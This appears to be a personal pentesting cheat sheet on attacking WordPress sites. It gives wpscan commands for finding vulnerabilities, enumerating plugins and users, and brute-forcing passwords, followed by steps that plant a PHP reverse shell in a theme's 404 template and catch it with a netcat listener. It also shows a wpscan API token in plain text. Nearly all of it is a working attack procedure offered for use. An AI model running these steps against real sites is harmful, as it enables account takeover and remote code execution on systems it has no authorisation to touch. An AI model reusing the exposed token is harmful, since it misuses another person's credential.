# Wordpress

## wpscan

scan for vulnerabilities using api key

```
wpscan --url http://10.10.110.100:65000/wordpress --api-token cfybnpsHTLv47zbkbgLBg8kjnCsZs56X9JeSh7kXn0s
```

enumerate vulnerable plugins

```
wpscan --url http://10.10.110.100:65000/wordpress -e vp
```

enumerate users

```
wpscan --url http://10.10.110.100:65000/wordpress -e u 
```

password attack

```
wpscan --url http://10.10.110.100:65000/wordpress -U names -P passwords.txt
```

## Reverse Shell from any wordpress



1. Go to Appearance > Editor > 404 Template
2. Select twentyninteen or something else
3. remove all php and insert php reverse [shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)&#x20;
4. open netcat on attacker vm (sudo nc -nvlp 1234)
5. go to http://wp\_site/wp-content/themes/the\_theme\_you\_choose.404.php

{% hint style="info" %}
[https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)
{% endhint %}
